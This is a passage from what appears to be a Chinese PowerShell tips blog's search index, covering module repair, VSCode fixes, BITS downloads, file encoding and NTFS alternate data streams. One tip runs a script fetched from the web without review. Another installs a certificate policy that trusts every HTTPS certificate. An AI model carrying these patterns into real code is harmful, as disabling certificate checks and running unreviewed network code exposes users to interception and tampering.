Out-ConsoleGridView，便一切就绪。","link":"/2021/02/18/cross-platform-out-gridview/"},{"title":"PowerShell 技能连载 - 修复 Install-Module (PowerShellGet)","text":"使用 Install-Module ，您可以轻松地从 PowerShell Gallery (www.powershellgallery.com) 下载和安装其他 PowerShell 模块。但是，在 Windows 系统上，此命令可能会中断。许多 Windows 系统仍随附 1.x 版本，并且 PowerShell Gallery 已切换到 Internet 协议 TLS 1.2，较早的 Windows 版本不会自动支持该协议。 要解决 Install-Module 的问题，您应确保 PowerShell 可以使用 TLS 1.2 来访问 PowerShell Gallery： 123[System.Net.ServicePointManager]::SecurityProtocol =[System.Net.ServicePointManager]::SecurityProtocol -bor[System.Net.SecurityProtocolType]::Tls12 接下来，您应该像这样手动重新安装 PowerShellGet 和 Packagemanagement 模块的当前版本（不需要管理员权限）： 12Install-Module -Name PowerShellGet -Scope CurrentUser -Force -AllowClobberInstall-Module -Name Packagemanagement -Scope CurrentUser -Force -AllowClobber 这应该能为大多数用户解决问题。 如果根本无法使用 Install-Module，则可以手动将 PowerShellGet 和 Packagemanagement 的模块文件夹从更新的 Windows 版本复制到另一个版本。运行以下行以查找可以在何处找到最新版本的 PowerShellGet： 1Get-Module -Name powershellget -ListAvailable | Sort-Object -Property Version -Descending | Select-Object -First 1 最新版本是 2.2.5，并且您不应使用低于 2.x 的版本。如果您的 PowerShell 报告系统上同时存在版本 1.x 和 2.x，则一切正常。PowerShell始终会自动选择最新版本。","link":"/2021/02/22/repairing-install-module-powershellget/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 命令","text":"Get-Command 可以帮助您查找给定任务的 PowerShell 命令，但是此 cmdlet 只能搜索命令名称和参数中的关键字。 可以从 PowerShell Gallery 中安装更复杂的搜索命令： 1Install-Module -Name PSCommandDiscovery -Scope CurrentUser -Verbose Find-PowerShellCommand 使用关键字并返回与此关键字相关的所有命令。它在命令名称，命令参数以及返回的对象属性中搜索关键字。如果找到的命令类型是已编译的应用程序，则该命令还将返回命令的类型（GUI 或基于控制台的命令）。 123456789101112131415161718192021222324PS&gt; Find-PowerShellCommand -Keyword user -CommandType Function,Cmdlet,ApplicationCommand MatchType Member------- --------- ------Add-WinADUserGroups CommandNameGet-ComputerInfo Property [string] CsUserName (read/write)Get-ComputerInfo Property [Nullable`1[[System.UInt32, Syst…Get-ComputerInfo Property [Nullable`1[[System.UInt32, Syst…Get-ComputerInfo Property [string] OsRegisteredUser (read/…Get-ComputerInfo Property [Nullable`1[[Microsoft.PowerShel…Get-Credential Property [string] UserName (readonly)Get-Culture Property [bool] UseUserOverride (readonly)Get-LocalUser CommandNameGet-PnPAADUser CommandNameGet-PnPTeamsUser CommandNameGet-PnPUser CommandNameGet-PnPUserOneDriveQuota CommandNameGet-PnPUserProfileProperty CommandNameGet-Process Property [timespan] UserProcessorTime (re…Get-UICulture Property [bool] UseUserOverride (readonly)DevModeRunAsUserConfig.msc Command .msc: DevModeRunAsUserConfig (Un…DsmUserTask.exe Command .exe: DsmUserTask (x64) [Gui] 10…quser.exe Command .exe: quser (x64) [Console] 10.0…(...) “MatchType“ 属性报告匹配的种类。可以根据命令名称，参数名称或返回对象的任何属性名称中的关键字匹配找到命令。 有关其他示例，源代码和所有参数的说明，请参见 https://github.com/TobiasPSP/PsCommandDiscovery。","link":"/2021/02/24/finding-powershell-commands/"},{"title":"PowerShell 技能连载 - 修复 VSCode PowerShell 问题（第 1 部分）","text":"有时，VSCode 在尝试启动 PowerShell 引擎时停止，或者报告诸如 “Language Server Startup failed” 之类的错误。 如果您遇到后一种异常，则可能与企业中的安全设置有关。要解决此问题，请在 PowerShell 控制台中运行以下行（这是一长行代码）： 1Import-Module $HOME\\.vscode\\extensions\\ms-vscode.powershell*\\modules\\PowerShellEditorServices\\PowerShellEditorServices.psd1 如果您没有得到提示，那么这不是造成问题的原因。如果确实收到提示要求确认导入此模块的提示，则只需允许运行“来自不受信任的发布者的软件”。该确认仅需要一次，因此下次 VSCode 尝试使用此模块启动 PowerShell 引擎时，很可能会解决您的问题。","link":"/2021/02/26/fixing-vscode-powershell-issues-part-1/"},{"title":"PowerShell 技能连载 - 修复 VSCode PowerShell 问题（第 2 部分）","text":"如果在编辑 PowerShell 脚本时 VSCode 不会启动 PowerShell 引擎，而状态栏中的黄色消息“正在启动 PowerShell”不会消失，则可能的解决方法是使用全新独立的可移植 PowerShell 7 安装作为 VSCode 中的默认 PowerShell 引擎。 首先，运行以下这行代码以创建 Install-PowerShell cmdlet ： 1Invoke-RestMethod -Uri https://aka.ms/install-powershell.ps1 | New-Item -Path function: -Name Install-PowerShell | Out-Null 接下来，在本地文件夹中安装 PowerShell 7 的新副本，例如： 1Install-PowerShell -Destination c:\\portablePowerShell 安装完成后，请确保可以手动启动新的 PowerShell 实例： 1c:\\portablePowerShell\\pwsh 现在，继续告诉 VSCode，您要在编辑 PowerShell 脚本时使用此新的 PowerShell 实例运行：在 VSCode 中，选择“文件/首选项/设置”，单击设置左栏中的“扩展”，然后单击子菜单中的“PowerShell 配置”。 接下来，搜索设置“PowerShell 默认版本”，然后输入任何名称，即“portable PowerShell 7”。在上面的“PowerShell Additional Exe Paths”部分中，单击链接“Edit in settings.json”。这将以 JSON 格式打开原始设置文件。 其中，新设置部分已经插入，需要像这样完成： 123456&quot;powershell.powerShellAdditionalExePaths&quot;: [ { &quot;exePath&quot;: &quot;c:\\\\portablePowerShell\\\\pwsh.exe&quot;, &quot;versionName&quot;: &quot;portable PowerShell 7&quot; } ] 注意：所有标记和关键字均区分大小写，并且在路径中，反斜杠需要由另一个反斜杠转义。在 “exePath” 中，在下载的可移植 PowerShell 文件夹中指定 pwsh.exe 文件的路径。确保路径不仅指向文件夹，而且指向 pwsh.exe。 在 “versionName” 中，使用之前在 “PowerShell Default Version” 中指定的相同标签名称。 保存 JSON 文件后，重新启动 VSCode。该编辑器现在使用您的 portable PowerShell 7，并且在许多情况下，这解决了 PowerShell 启动卡住的问题。 如果您想手动将其他 PowerShell 版本添加到 VSCode，则上面的方法也很有用。当您单击 VSCode 状态栏中的绿色 PowerShell 版本时，任何手动添加的 PowerShell 将出现在选择对话框中（除非已被使用，在这种情况下，该菜单将显示 PowerShell 类型和版本，而不是您的标签名称）。","link":"/2021/03/02/fixing-vscode-powershell-issues-part-2/"},{"title":"PowerShell 技能连载 - 使用编码标准","text":"使用文本文件时，务必始终使用相同的文本编码进行读取和写入，否则特殊字符可能会损坏，或者文本文件可能变得不可读，这一点很重要。 在 PowerShell 7 中，除非您指定其他编码，否则所有 cmdlet 以及重定向操作符都将使用默认的 UTF8 文本编码。那挺好的。 在W indows PowerShell 中，不同的 cmdlet 使用不同的默认编码。所以，要为所有 cmdlet 和重定向操作符建立通用的默认默认编码，您应该为带有参数 -Encoding 的任何命令设置默认参数值。 将以下行放入您的配置文件脚本中： 1$PSDefaultParameterValues.Add('*:Encoding', 'UTF8') 此外，在 Windows PowerShell 中，无论 cmdlet 是否具有参数 -Encoding，都指定一个唯一的值。当前推荐的编码为UTF8。","link":"/2021/03/04/using-encoding-standards/"},{"title":"PowerShell 技能连载 - 转换 Word 文档","text":"现在仍然有许多旧文件格式（.doc 而不是 .docx）的 Microsoft Office 文档。 这是一个简单的 PowerShell 函数，它将旧的 .doc Word 文档转换为 .docx 格式并保存。如果未锁定旧的 Word 文档，则此过程是完全不可见的，并且可以在无人值守的情况下运行： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function Convert-Doc2Docx{ param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [string] [Alias('FullName')] $Path, [string] $DestinationFolder ) begin { $word = New-Object -ComObject Word.Application } process { $pathOut = [System.IO.Path]::ChangeExtension($Path, '.docx') if ($PSBoundParameters.ContainsKey('DestinationFolder')) { $exists = Test-Path -Path $DestinationFolder -PathType Container if (!$exists) { throw &quot;Folder not found: $DestinationFolder&quot; } $name = Split-Path -Path $pathOut -Leaf $pathOut = Join-Path -Path $DestinationFolder -ChildPath $name } $doc = $word.Documents.Open($Path) $name = Split-Path -Path $Path -Leaf Write-Progress -Activity 'Converting' -Status $name $doc.Convert() $doc.SaveAs([ref]([string]$PathOut),[ref]16) $word.ActiveDocument.Close() } end { $word.Quit() }}","link":"/2021/03/08/converting-word-documents/"},{"title":"PowerShell 技能连载 - 信任自签名的 HTTPS 证书","text":"如果您需要访问使用自签名测试证书或已过期或不可信的证书的 HTTPS 网站，PowerShell 将拒绝连接。在大多数情况下，这是正确的选择，但有时您知道目标服务器是安全的。 这是一段通过重写证书策略来信任所有 HTTPS 证书的 PowerShell 代码。新的证书策略始终返回 $true 并完全信任任何证书： 123456789class TrustAll : System.Net.ICertificatePolicy{ [bool]CheckValidationResult([System.Net.ServicePoint]$sp, [System.Security.Cryptography.X509Certificates.X509Certificate]$cert, [System.Net.WebRequest]$request, [int]$problem) { return $true }}[System.Net.ServicePointManager]::CertificatePolicy = [TrustAll]::new()","link":"/2021/03/10/trusting-self-signed-https-certificates/"},{"title":"PowerShell 技能连载 - 保存文本文件时去掉 BOM","text":"在 Windows上，默认情况下，许多 cmdlet 使用BOM (Byte Order Mask) 编码对文本文件进行编码。 BOM 会在文本文件的开头写入一些额外的字节，以标记用于写入文件的编码。 不幸的是，BOM 编码在 Windows 世界之外并未得到很好的采用。如今，当您在 Windows 系统上保存文本文件并将其上传到 GitHub 时，BOM 编码可能会损坏文件或使其完全不可读。 以下是一段可用于确保以与 Linux 兼容的方式，在不使用 BOM 的情况下保存文本文件： 12345$outpath = &quot;$env:temp\\nobom.txt&quot;$text = 'This is the text to write to disk.'$Utf8NoBomEncoding = [System.Text.UTF8Encoding]::new($false)[System.IO.File]::WriteAllLines($outpath, $text, $Utf8NoBomEncoding)$outpath","link":"/2021/03/12/saving-text-files-without-bom/"},{"title":"PowerShell 技能连载 - 探索文件夹结构（第 1 部分）","text":"这是一个快速示例，说明了如何发现文件夹结构。本示例采用任何根文件夹路径，并递归遍历其子文件夹。 对于每个子文件夹，将返回一个新的自定义对象，其中包含文件和子文件夹计数以及相对的子文件夹路径： 1234567891011121314151617# specify the folder that you want to discover# $home is the root folder of your user profile# you can use any folder: $path = 'c:\\somefolder'$path = $HOME# find all subfolders...Get-ChildItem $path -Directory -Recurse -ErrorAction Ignore |ForEach-Object { # return custom object with relative subfolder path and # file count [pscustomobject]@{ # use GetFiles() to find all files in folder: FileCount = $_.GetFiles().Count FolderCount = $_.GetDirectories().Count FullName = $_.Fullname.Substring($path.Length+1) }}","link":"/2021/03/16/exploring-folder-structures-part-1/"},{"title":"PowerShell 技能连载 - 探索文件夹结构（第 2 部分）","text":"仅使用几个 cmdlet，您就可以检查文件夹结构，即返回文件夹树中子文件夹的大小。 这是一个返回文件夹总大小和相对大小的示例： 123456789101112131415161718192021# specify the folder that you want to discover# $home is the root folder of your user profile# you can use any folder: $path = 'c:\\somefolder'$path = $HOME# specify the depth you want to examine (the number of levels you'd like# to dive into the folder tree)$Depth = 3# find all subfolders...Get-ChildItem $path -Directory -Recurse -ErrorAction Ignore -Depth $Depth |ForEach-Object { Write-Progress -Activity 'Calculating Folder Size' -Status $_.FullName # return the desired information as a new custom object [pscustomobject]@{ RelativeSize = Get-ChildItem -Path $_.FullName -File -ErrorAction Ignore | &amp; { begin { $c = 0 } process { $c += $_.Length } end { $c }} TotalSize = Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction Ignore | &amp; { begin { $c = 0 } process { $c += $_.Length } end { $c }} FullName = $_.Fullname.Substring($path.Length+1) }} 注意代码是如何总结所有文件的大小的：它调用带有开始、处理和结束块的脚本块。 begin 块在管道启动之前执行，并将计数变量设置为零。对于每个传入的管道对象，将重复执行该 “process“ 块，并将 “Length“ 属性中的文件大小添加到计数器。当管道完成时，将执行 “end“ 块并返回计算出的总和。 这种方法比使用 ForEach-Object 快得多，但仍比使用 Measure-Object 快一点。您可以通过这种方式计算各种事物。此代码计算 Get-Service 发出的对象数量： 12# counting number of objectsGet-Service | &amp; { begin { $c = 0 } process { $c++ } end { $c }} 请注意，这是一种“流式”方法，无需将所有对象存储在内存中。对于少量对象，您也可以使用“下载”方法并将所有元素存储在内存中，然后使用 Count 属性： 1(Get-Service).Count","link":"/2021/03/18/exploring-folder-structures-part-2/"},{"title":"PowerShell 技能连载 - 识别网络访问的来源","text":"Get-NetTCPConnection 返回所有当前的 TCP 网络连接，但是此 cmdlet 不会确切告诉您谁在连接到您的计算机。您仅得到 IP 地址： 1234567PS&gt; Get-NetTCPConnection -RemotePort 443LocalAddress LocalPort RemoteAddress RemotePort State AppliedSetting OwningProcess------------ --------- ------------- ---------- ----- -------------- ---------192.168.2.110 60960 13.107.6.171 443 Established Internet 21824192.168.2.110 60959 20.44.232.74 443 Established Internet 4540192.168.2.110 60956 52.184.216.226 443 Established Internet 13204 使用计算属性，您可以重新计算返回的值，例如，将 IP 地址发送到公开真实来源的 Web 服务。使用相同的技术，您还可以转换在 OwningProcess 中找到的进程 ID，并返回维护连接的进程名称： 123456789101112131415$process = @{ Name = 'ProcessName' Expression = { (Get-Process -Id $_.OwningProcess).Name }}$darkAgent = @{ Name = 'ExternalIdentity' Expression = { $ip = $_.RemoteAddress (Invoke-RestMethod -Uri &quot;http://ipinfo.io/$ip/json&quot; -UseBasicParsing -ErrorAction Ignore).org }}Get-NetTCPConnection -RemotePort 443 -State Established | Select-Object -Property RemoteAddress, OwningProcess, $process, $darkAgent 结果提供了对连接的更多了解，并且该示例显示了所有 HTTPS 连接及其外部目标： RemoteAddress OwningProcess ProcessName ExternalIdentity ------------- ------------- ----------- ---------------- 13.107.6.171 21824 WINWORD AS8068 Microsoft Corporation 52.113.194.132 15480 Teams AS8068 Microsoft Corporation 52.114.32.24 25476 FileCoAuth AS8075 Microsoft Corporation 142.250.185... 15744 chrome AS15169 Google LLC 52.114.32.24 3800 OneDrive AS8075 Microsoft Corporation 52.114.32.24 3800 OneDrive AS8075 Microsoft Corporation 45.60.13.212 9808 AgentShell AS19551 Incapsula Inc 18.200.231.29 15744 chrome AS16509 Amazon.com, Inc.","link":"/2021/03/22/identifying-origin-of-network-access/"},{"title":"PowerShell 技能连载 - 研究 PowerShell 控制台输出","text":"当您在 PowerShell 控制台中看到命令的结果时，通常仅显示部分信息。要查看完整的信息，您需要将其发送到 Select-Object 并使用 “*“ 通配符显式选择所有属性： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PS&gt; Get-CimInstance -ClassName Win32_BIOSSMBIOSBIOSVersion : 1.7.1Manufacturer : Dell Inc.Name : 1.7.1SerialNumber : 4ZKM0Z2Version : DELL - 20170001PS&gt; Get-CimInstance -ClassName Win32_BIOS | Select-Object -Property *Status : OKName : 1.7.1Caption : 1.7.1SMBIOSPresent : TrueDescription : 1.7.1InstallDate :BuildNumber :CodeSet :IdentificationCode :LanguageEdition :Manufacturer : Dell Inc.OtherTargetOS :SerialNumber : 4ZKM0Z2SoftwareElementID : 1.7.1SoftwareElementState : 3TargetOperatingSystem : 0Version : DELL - 20170001PrimaryBIOS : TrueBiosCharacteristics : {7, 9, 11, 12...}BIOSVersion : {DELL - 20170001, 1.7.1, Dell - 10000}CurrentLanguage : enUSEmbeddedControllerMajorVersion : 255EmbeddedControllerMinorVersion : 255InstallableLanguages : 1ListOfLanguages : {enUS}ReleaseDate : 28.12.2020 01:00:00SMBIOSBIOSVersion : 1.7.1SMBIOSMajorVersion : 3SMBIOSMinorVersion : 1SystemBiosMajorVersion : 1SystemBiosMinorVersion : 7PSComputerName :CimClass : root/cimv2:Win32_BIOSCimInstanceProperties : {Caption, Description, InstallDate, Name...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties 这是因为 PowerShell 包含的逻辑会自动仅选择对象的最重要属性，以使您专注于重要的事情。为了更好地理解它是如何工作的，这里有一些示例代码来探索 Get-Process 返回的数据。要研究其他 cmdlet，请将代码中的 “Get-Process“ 替换为另一个 cmdlet 的名称： 1Install-Module -Name PSCommandDiscovery -Scope CurrentUser -Verbose 该代码确定 cmdlet 发出的数据类型，然后找到定义该数据类型视图的 *.format.ps1xml 文件，并返回该定义的前 20 行： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 &lt;/ViewSelectedBy&gt; &lt;TableControl&gt; &lt;TableHeaders&gt; &lt;TableColumnHeader&gt; &lt;Label&gt;Handles&lt;/Label&gt; &lt;Width&gt;7&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Label&gt;NPM(K)&lt;/Label&gt; &lt;Width&gt;7&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Label&gt;PM(K)&lt;/Label&gt; &lt;Width&gt;8&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Label&gt;WS(K)&lt;/Label&gt; &lt;/ViewSelectedBy&gt; &lt;GroupBy&gt; &lt;PropertyName&gt;PriorityClass&lt;/PropertyName&gt; &lt;Label&gt;PriorityClass&lt;/Label&gt; &lt;/GroupBy&gt; &lt;TableControl&gt; &lt;TableHeaders&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;20&lt;/Width&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;10&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;13&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;12&lt;/Width&gt; &lt;/ViewSelectedBy&gt; &lt;GroupBy&gt; &lt;ScriptBlock&gt;$_.StartTime.ToShortDateString()&lt;/ScriptBlock&gt; &lt;Label&gt;StartTime.ToShortDateString()&lt;/Label&gt; &lt;/GroupBy&gt; &lt;TableControl&gt; &lt;TableHeaders&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;20&lt;/Width&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;10&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;13&lt;/Width&gt; &lt;Alignment&gt;right&lt;/Alignment&gt; &lt;/TableColumnHeader&gt; &lt;TableColumnHeader&gt; &lt;Width&gt;12&lt;/Width&gt; &lt;/ViewSelectedBy&gt; &lt;WideControl&gt; &lt;WideEntries&gt; &lt;WideEntry&gt; &lt;WideItem&gt; &lt;PropertyName&gt;ProcessName&lt;/PropertyName&gt; &lt;/WideItem&gt; &lt;/WideEntry&gt; &lt;/WideEntries&gt; &lt;/WideControl&gt;&lt;/View&gt;&lt;View&gt; &lt;Name&gt;DateTime&lt;/Name&gt; &lt;ViewSelectedBy&gt; &lt;TypeName&gt;System.DateTime&lt;/TypeName&gt; &lt;/ViewSelectedBy&gt; &lt;CustomControl&gt; &lt;CustomEntries&gt; &lt;CustomEntry&gt; &lt;CustomItem&gt; &lt;ExpressionBinding&gt; &lt;PropertyName&gt;DateTime&lt;/PropertyName&gt; &lt;/ExpressionBinding&gt; &lt;/CustomItem&gt; 尽管示例代码为了简单起见不会给出完整的定义，但它使您可以更好地了解幕后发生的事情：每当 cmdlet 返回类型为 System.Diagnostics.Process 的对象时，PowerShell 默认都会根据到公开的 XML 定义。 在上面的示例中更改 cmdlet 名称时，您也可以看到其他类型的定义。但是，为简单起见，示例代码仅搜索在 PowerShell 主目录中找到的 *.format.ps1xml 文件，而不在可能存在其他格式定义的所有模块位置中搜索。 注意：本技能仅适用于 Windows PowerShell。","link":"/2021/03/24/investigating-powershell-console-output/"},{"title":"PowerShell 技能连载 - 使用 BITS 来下载文件（第 1 部分）","text":"BITS（后台智能传输系统）是 Windows 用于下载大文件（例如操作系统更新）的技术。您也可以使用相同的系统下载大文件。另外一个好处是，在下载文件时，您会获得一个不错的进度条。本示例下载 NASA 火星报告并在下载后播放视频： 123456789$url = 'https://mars.nasa.gov/system/downloadable_items/41764_20180703_marsreport-1920.mp4'$targetfolder = $env:temp$filename = Split-Path -Path $url -Leaf$targetFile = Join-Path -Path $targetfolder -ChildPath $filenameStart-BitsTransfer -Source $url -Destination $targetfolder -Description 'Downloading Video...' -Priority LowStart-Process -FilePath $targetFile 请注意 Start-BitsTransfer 如何让您选择下载优先级，这样您就可以下载文件而不会占用更重要的事情所需的网络带宽。另请注意，BITS 不适用于所有下载内容。服务器需要支持该技术。","link":"/2021/03/26/using-bits-to-download-files-part-1/"},{"title":"PowerShell 技能连载 - 使用 BITS 来下载文件（第 2 部分）","text":"BITS（背景智能传输系统）是Windows用于下载大文件（例如操作系统更新）的技术。您也可以使用该服务，例如异步下载文件。执行此操作时，您无需等待下载完成，甚至可以在几天内跨越多次重启下载超大文件。每当用户再次登录时，下载就会继续。 下面的示例代码以较低优先级的异步后台任务下载 NASA 火星报告： 123$url = 'https://mars.nasa.gov/system/downloadable_items/41764_20180703_marsreport-1920.mp4'$targetfolder = $env:tempStart-BitsTransfer -Source $url -Destination $targetfolder -Asynchronous -Priority Low 异步 BITS 传输的缺点是您需要手动完成文件传输，因为 BITS 会将数据下载到隐藏的缓存中。由您决定何时运行 Get-BitsTransfer 并确定已完成的作业，然后使用 Complete-BitsTransfer 完成文件传输。 本示例将检查是否已完成传输并完成下载： 123456789101112Get-BitsTransfer | ForEach-Object { Write-Warning $_.FileList.RemoteName $_ } | Where-Object { $_.jobstate -eq 'Transferred' } | ForEach-Object { #$_ | Select-Object -Property * $file = $_.FileList.LocalName Write-Warning &quot;Copy file $file...&quot; $_ | Complete-BitsTransfer } Windows 正在使用相同的技术来下载大量的操作系统更新。如果您具有管理员特权，则可以检查由其他用户（包括操作系统）发起的 BITS 传输： 123456789101112131415PS&gt; Get-BitsTransfer -AllUsersJobId DisplayName TransferType JobState----- ----------- ------------ ------18514439-0e92-4ca8-88b4-4b2aa0036114 MicrosoftMapsBingGeoStore Download Sus...9e76ff92-65e2-4b3c-bb01-263e485e986a Dell_Asimov.C18EE5B49BDB373421EFA627336E417FC7EBB5B3 Download Sus...7bd117fe-2326-4198-a2a6-884022acb3ad Dell_Asimov.F10AAAECCA3ED0E344B68351EB619B5356E6C3C5 Download Sus...PS&gt; Get-BitsTransfer -AllUsers | Select-Object OwnerAccount, Priority, FileListOwnerAccount Priority FileList------------ -------- --------NT AUTHORITY\\NETWORK SERVICE Normal {}NT AUTHORITY\\SYSTEM Foreground {https://downloads.dell.com/catalog/CatalogIndexPC.cab}NT AUTHORITY\\SYSTEM Foreground {https://dellupdater.dell.com/non_du/ClientService/Catalog/CatalogI...","link":"/2021/03/30/using-bits-to-download-files-part-2/"},{"title":"PowerShell 技能连载 - 查找上次登录的用户","text":"要查找有关 Windows 上最后登录的用户的详细信息，可以查询注册表： 12Get-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI&quot; | Select-Object -Property LastLo*, Idle* 结果看起来像这样： LastLoggedOnDisplayName : Tobias Weltner LastLoggedOnProvider : {D6886603-9D2F-4EB2-B667-1971041FA96B} LastLoggedOnSAMUser : .\\tobia LastLoggedOnUser : .\\tobia LastLoggedOnUserSID : S-1-5-21-2770831484-2260150476-2133527644-1001 IdleTime : 62486093 同样，此行返回 Windows 注册表中注册的所有用户配置文件： 12Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\profilelist\\*' |Select-Object -Property ProfileImagePath, FullProfile","link":"/2021/04/01/finding-last-logged-on-user/"},{"title":"PowerShell 技能连载 - 观看德国电视节目","text":"德国公共广播公司保留着丰富的电视档案，并允许用户通过 Web 界面观看其节目。通常无法下载节目或轻松找到其下载 URL。 以下脚本下载了所有节目及其网络位置的非官方目录： 1234# download the German mediathek database as JSON file$path = &quot;$env:temp\\tv.json&quot;$url = 'http://www.mediathekdirekt.de/good.json'Invoke-RestMethod -Uri $url -UseBasicParsing -OutFile $path 下载该文件后，您可以使用其他脚本来显示选择对话框，并浏览要观看的电视节目。然后，您可以选择一个或多个节目，并要求 PowerShell 将这些视频自动下载到您的计算机上。 1234567891011121314151617181920212223242526272829$Path = &quot;$env:temp\\tv.json&quot;$data = Get-Content -Path $Path -Raw |ConvertFrom-Json |ForEach-Object { $_ } |ForEach-Object { # define a string describing the video. This string will be shown in a grid view window $title = '{0,5} [{2}] &quot;{1}&quot; ({3})' -f ([Object[]]$_) # add the original data to the string so when the user select a video, # the details i.e. download URL is still available $title | Add-Member -MemberType NoteProperty -Name Data -Value $_ -PassThru}$data |Sort-Object |Out-GridView -Title 'Select Video(s)' -OutputMode Multiple |ForEach-Object { # take the download URL from the attached original data $url = $_.Data[5] $filename = Split-Path -Path $url -Leaf $filepath = Join-Path -Path $env:temp -ChildPath $filename $title = 'Video download {0} ({1})' -f $_.Data[1], $_.Data[0] Start-BitsTransfer -Description $title -Source $url -Destination $filepath # you can use a simple web request as well in case BITS isn't available # Invoke-WebRequest -Uri $url -OutFile $filepath -UseBasicParsing # open video in associated player Invoke-Item -Path $filepath}","link":"/2021/04/05/watching-german-tv-shows/"},{"title":"PowerShell 技能连载 - 使用 NTFS 流（第 1 部分）","text":"在 NTFS 文件系统上，您可以将其他信息存储在隐藏的文件流中。传统上，PowerShell 通过冒号访问文件流，因此这会将隐藏的文本信息附加到纯文本文件： 12345678910111213# create a sample file$desktop = [Environment]::GetFolderPath('Desktop')$path = Join-Path -Path $desktop -ChildPath 'testfile.txt''Test' | Out-File -FilePath $Path# attach hidden info to the file'this is hidden' | Set-Content -Path &quot;${path}:myHiddenStream&quot;# attach even more hidden info to the file'this is also hidden' | Set-Content -Path &quot;${path}:myOtherHiddenStream&quot;# show fileexplorer /select,$Path 该代码首先确定到您的桌面的路径，然后创建一个示例纯文本文件。 接下来，它在名为 “myHiddenStream” 和 “myOtherHiddenStream” 的两个流中添加隐藏信息。当您在资源管理器中查看文件时，这些流仍然不可见。 PowerShell 仍然可以像下面这样访问这些流： 123# get hidden info from the fileGet-Content -Path &quot;${path}:myHiddenStream&quot;Get-Content -Path &quot;${path}:myOtherHiddenStream&quot; 请注意，这些流仅存在于使用 NTFS 文件系统的存储中。当您将这些文件复制到其他文件系统时，即使用 exFat 将它们复制到USB记忆棒中，Windows 将显示一个警告对话框，提示所有流将被删除。","link":"/2021/04/07/working-with-ntfs-streams-part-1/"},{"title":"PowerShell 技能连载 - 使用 NTFS 流（第 2 部分）","text":"在上一个技巧中，我们解释了 NTFS 流如何存储有关文件的其他数据，这引发了一个问题，即如何删除此类流或首先发现隐藏的 NTFS 流。 要删除隐藏的命名流，请使用 Remove-Item——就像您要删除整个文件一样。这是一个简单的示例： 123456789101112131415161718# create a sample file$path = &quot;$env:temp\\test.txt&quot;'Test' | Out-File -FilePath $Path# attach hidden info to the file'this is hidden' | Set-Content -Path &quot;${path}:myHiddenStream&quot;# get hidden info from the fileGet-Content -Path &quot;${path}:myHiddenStream&quot;# remove hidden streamsRemove-Item -Path &quot;${path}:myHiddenStream&quot;# stream is gone, this raises an error:Get-Content -Path &quot;${path}:myHiddenStream&quot;# file with main stream is still there:explorer /select,$Path 尽管您可以像创建单个文件一样创建和删除 NTFS 流，只需添加一个冒号和流名称即可，但没有找到流名称的简单方法。至少不是我们在这里访问流的方式。在第 3 部分中，我们最终将发现隐藏的流名称。","link":"/2021/04/09/working-with-ntfs-streams-part-2/"},{"title":"PowerShell 技能连载 - 使用 NTFS 流（第 3 部分）","text":"在上一个技能中，我们解释了 NTFS 流是如何工作的。但是，不可能发现隐藏文件流的名称。在 PowerShell 5及更高版本中，大多数访问文件系统的 cmdlet 都新增了一个名为 -Stream 的新参数。有了它，现在访问 NTFS 流变得很简单，因此现在可以重写以前脚本中使用路径名称中的冒号表示的示例，如下所示： 12345678910111213141516# create a sample file$desktop = [Environment]::GetFolderPath('Desktop')$path = Join-Path -Path $desktop -ChildPath 'testfile.txt''Test' | Out-File -FilePath $Path# attach hidden info to the file'this is hidden' | Set-Content -Path $path -Stream myHiddenStream# get hidden info from the fileGet-Content -Path $path -Stream myHiddenStream# remove hidden streamsRemove-Item -Path $Path -Stream myHiddenStream# show fileexplorer /select,$Path 现在，还可以查看（并发现）隐藏的 NTFS 流。让我们创建一个带有一堆流的示例文件： 12345678910111213# create a sample file$desktop = [Environment]::GetFolderPath('Desktop')$path = Join-Path -Path $desktop -ChildPath 'testfile.txt''Test' | Out-File -FilePath $Path# attach hidden info to the file'this is hidden' | Set-Content -Path $path -Stream myHiddenStream'more info' | Set-Content -Path $path -Stream additionalInfo'anotherone' | Set-Content -Path $path -Stream 'blanks work, too''last' | Set-Content -Path $path -Stream finalStream# find stream names:Get-Item -Path $Path -Stream * | Select-Object -Property Stream, Length 现在，Get-Item 可以暴露 NTFS 流，并且输出可能如下所示： Stream Length ------ ------ :$DATA 14 additionalInfo 11 blanks work, too 12 finalStream 6 myHiddenStream 16 如您所见，您现在可以发现所有流的名称。流 “:$DATA” 表示文件的“可见的”主要内容。","link":"/2021/04/13/working-with-ntfs-streams-part-3/"},{"title":"PowerShell 技能连载 - 使用 NTFS 流（第 4 部分）","text":"每当您从 Internet（或其他不受信任的来源）下载文件并将其存储在 NTFS 驱动器上时，Windows 就会使用区域标识符对这些文件进行静默标记。例如，这就是为什么 PowerShell 拒绝执行从域外部下载的脚本的原因。 您实际上可以查看区域标识符。只要确保您从 Internet 下载文件并将其存储在 NTFS 